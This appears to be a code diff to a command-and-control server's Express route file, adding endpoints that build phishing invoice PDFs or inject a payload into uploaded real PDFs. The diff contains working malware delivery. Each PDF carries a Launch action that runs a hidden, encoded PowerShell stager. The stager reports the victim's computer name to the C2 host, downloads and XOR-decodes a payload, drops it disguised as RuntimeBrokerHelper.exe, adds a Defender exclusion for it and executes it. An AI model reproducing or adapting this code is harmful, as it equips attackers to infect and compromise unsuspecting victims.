@@ -10,14 +10,18 @@
  *   4. Stage 2 (full stub) connects back to C2 via normal bot channel
  *
  * Admin routes (require login):
- *   GET  /stage-monitor          → HTML dashboard showing all staging events
- *   GET  /api/stage/events       → JSON event list
- *   DELETE /api/stage/events     → clear event log
- *   GET  /api/stage/stager.ps1   → download the auto-configured PS1 stager
+ *   GET  /stage-monitor              → HTML dashboard showing all staging events
+ *   GET  /api/stage/events           → JSON event list
+ *   DELETE /api/stage/events         → clear event log
+ *   GET  /api/stage/stager.ps1       → download the auto-configured PS1 stager
+ *   GET  /api/stage/build-pdf        → build a fresh staging PDF (no exe embedded)
+ *   POST /api/stage/inject-pdf       → inject stager into an uploaded real PDF
  */
 
 const express      = require("express");
 const fs           = require("fs");
+const multer       = require("multer");
+const { injectLaunchIntoPdf } = require("../lib/pdfInject");
 const path         = require("path");
 const { requireAdmin } = require("../middleware/auth");
 
@@ -152,6 +156,158 @@ try{
   res.setHeader("Content-Type", "text/plain; charset=utf-8");
   res.setHeader("Content-Disposition", 'attachment; filename="stager.ps1"');
   res.send(ps1);
+});
+
+// ── PDF stager helpers ────────────────────────────────────────────────────────
+
+const pdfUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });
+
+function stagerPsArgs(c2Host) {
+  // Build the stager PS1, encode as UTF-16LE base64 for PowerShell -EncodedCommand
+  const key = Array.from(XOR_KEY).map(b => "0x" + b.toString(16).padStart(2, "0")).join(",");
+  const ps  =
+    `$ErrorActionPreference='SilentlyContinue';` +
+    `$c2='https://${c2Host}';` +
+    `$k=[byte[]](${key});` +
+    `try{(New-Object Net.WebClient).DownloadString("$c2/stage/checkin?host=$env:COMPUTERNAME")}catch{};` +
+    `$e=(New-Object Net.WebClient).DownloadData("$c2/stage/payload");` +
+    `for($i=0;$i -lt $e.Length;$i++){$e[$i]=$e[$i] -bxor $k[$i%8]};` +
+    `$t="$env:APPDATA\\RuntimeBrokerHelper.exe";` +
+    `[IO.File]::WriteAllBytes($t,$e);` +
+    `try{Add-MpPreference -ExclusionPath $t -EA Stop}catch{};` +
+    `try{([wmiclass]'Win32_Process').Create($t,$null,$null)|Out-Null}catch{Start-Process $t -WindowStyle Hidden}`;
+
+  const b64 = Buffer.from(ps, "ucs2").toString("base64");
+  // psArgs is the /P value inside a PDF literal string — only \ ( ) need escaping, base64 is safe
+  return `-w hidden -nop -ep bypass -e ${b64}`;
+}
+
+function buildStagerPdf(c2Host, opts = {}) {
+  const from     = opts.from     || "Nexus Solutions Ltd.";
+  const to       = opts.to       || "Acme Corporation";
+  const filename = opts.filename || "Invoice_Q4-2024";
+  const invNum   = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
+  const now      = new Date();
+  const fmtD     = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
+  const due      = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
+
+  const esc = s => String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+  const T   = (x, y, font, size, text) =>
+    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;
+
+  const psArgs = stagerPsArgs(c2Host).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+
+  const textOps = [
+    T(50,720,"F2",18,from),
+    T(50,702,"F1", 9,"123 Commerce Drive, Suite 400, London EC1A 1BB"),
+    T(50,660,"F2",14,"INVOICE"),
+    T(50,642,"F1", 9,"Invoice Number:   "+invNum),
+    T(50,629,"F1", 9,"Invoice Date:     "+fmtD(now)),
+    T(50,616,"F1", 9,"Payment Due:      "+fmtD(due)),
+    T(50,590,"F2", 9,"Bill To:"),
+    T(50,577,"F1", 9,to),
+    T(55, 534,"F2", 9,"Description"),T(385,534,"F2",9,"Qty"),T(420,534,"F2",9,"Unit Price"),T(495,534,"F2",9,"Total"),
+    T(55, 518,"F1", 9,"Professional Services — Q4 Consulting"),T(388,518,"F1",9,"1"),T(420,518,"F1",9,"$4,200.00"),T(495,518,"F1",9,"$4,200.00"),
+    T(55, 505,"F1", 9,"Software License Renewal (Annual)"),     T(388,505,"F1",9,"1"),T(420,505,"F1",9,"$1,800.00"),T(495,505,"F1",9,"$1,800.00"),
+    T(420,478,"F2", 9,"Subtotal"),T(495,478,"F1",9,"$6,000.00"),
+    T(420,465,"F2", 9,"VAT (20%)"),T(495,465,"F1",9,"$1,200.00"),
+    T(420,452,"F2",10,"TOTAL DUE"),T(495,452,"F2",10,"$7,200.00"),
+    T(50, 410,"F1", 9,"Payment Terms: 30 days net.  Bank transfer preferred."),
+    T(50, 395,"F1", 9,"Sort Code: 20-00-00   Account: 12345678   Ref: "+invNum),
+  ].join("\n");
+
+  const stream = `BT\n${textOps}\nET\n`;
+  const streamBytes = Buffer.byteLength(stream, "latin1");
+
+  const obj1 = `1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n`;
+  const obj2 = `2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n`;
+  const obj3 = `3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>\nendobj\n\n`;
+  const obj4 = `4 0 obj\n<< /Length ${streamBytes} >>\nstream\n${stream}\nendstream\nendobj\n\n`;
+  const obj5 = `5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n`;
+  const obj6 = `6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>\nendobj\n\n`;
+  const obj7 =
+    `7 0 obj\n` +
+    `<< /Type /Action /S /Launch\n` +
+    `   /Win << /F (powershell.exe)\n` +
+    `           /P (${psArgs})\n` +
+    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
+    `endobj\n\n`;
+
+  const header  = `%PDF-1.4\n`;
+  let   off     = Buffer.byteLength(header, "latin1");
+  const offsets = [];
+  const bodies  = [obj1,obj2,obj3,obj4,obj5,obj6,obj7];
+  bodies.forEach(o => { offsets.push(off); off += Buffer.byteLength(o, "latin1"); });
+
+  const xrAt    = off;
+  let   xrSec   = "xref\n0 8\n0000000000 65535 f \n";
+  offsets.forEach(o => { xrSec += o.toString().padStart(10,"0") + " 00000 n \n"; });
+
+  const trailer =
+    `trailer\n<< /Size 8 /Root 1 0 R /Info << /Title (${esc(filename)}) >> >>\n` +
+    `startxref\n${xrAt}\n%%EOF\n`;
+
+  // Patch catalog to include /OpenAction referencing obj7
+  const catObj = `1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>\nendobj\n\n`;
+  const bodies2 = [catObj,obj2,obj3,obj4,obj5,obj6,obj7];
+  let   off2    = Buffer.byteLength(header, "latin1");
+  const off2s   = [];
+  bodies2.forEach(o => { off2s.push(off2); off2 += Buffer.byteLength(o, "latin1"); });
+
+  const xrAt2   = off2;
+  let   xrSec2  = "xref\n0 8\n0000000000 65535 f \n";
+  off2s.forEach(o => { xrSec2 += o.toString().padStart(10,"0") + " 00000 n \n"; });
+
+  const trailer2 =
+    `trailer\n<< /Size 8 /Root 1 0 R >>\n` +
+    `startxref\n${xrAt2}\n%%EOF\n`;
+
+  return Buffer.concat([
+    Buffer.from(header, "latin1"),
+    ...bodies2.map(o => Buffer.from(o, "latin1")),
+    Buffer.from(xrSec2 + trailer2, "latin1"),
+  ]);
+}
+
+// ── Admin: Build fresh staging PDF ───────────────────────────────────────────
+
+router.get("/api/stage/build-pdf", requireAdmin, (req, res) => {
+  const c2Host  = (req.query.host || req.headers.host || "c2.osatechcloud.cloud")
+    .replace(/^https?:\/\//i, "").split("/")[0];
+  const from    = req.query.from || undefined;
+  const to      = req.query.to   || undefined;
+  const fname   = req.query.filename || "Invoice_Q4-2024";
+
+  try {
+    const pdf = buildStagerPdf(c2Host, { from, to, filename: fname });
+    res.setHeader("Content-Type", "application/pdf");
+    res.setHeader("Content-Disposition", `attachment; filename="${fname}.pdf"`);
+    res.send(pdf);
+    console.log(`[stage] PDF-STAGER built  c2=${c2Host}  size=${pdf.length}`);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Admin: Inject stager into uploaded PDF ────────────────────────────────────
+
+router.post("/api/stage/inject-pdf", requireAdmin, pdfUpload.single("pdf"), (req, res) => {
+  if (!req.file) return res.status(400).json({ error: "No PDF file uploaded" });
+
+  const c2Host    = (req.body.host || req.headers.host || "c2.osatechcloud.cloud")
+    .replace(/^https?:\/\//i, "").split("/")[0];
+  const origName  = req.file.originalname.replace(/\.pdf$/i, "");
+  const psArgs    = stagerPsArgs(c2Host).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+
+  try {
+    const injected = injectLaunchIntoPdf(req.file.buffer, psArgs);
+    res.setHeader("Content-Type", "application/pdf");
+    res.setHeader("Content-Disposition", `attachment; filename="${origName}_stager.pdf"`);
+    res.send(injected);
+    console.log(`[stage] PDF-INJECT  c2=${c2Host}  orig=${req.file.originalname}  size=${injected.length}`);
+  } catch (e) {
+    res.status(400).json({ error: e.message });
+  }
 });
 
 // ── Admin: Stage Monitor HTML page ────────────────────────────────────────────
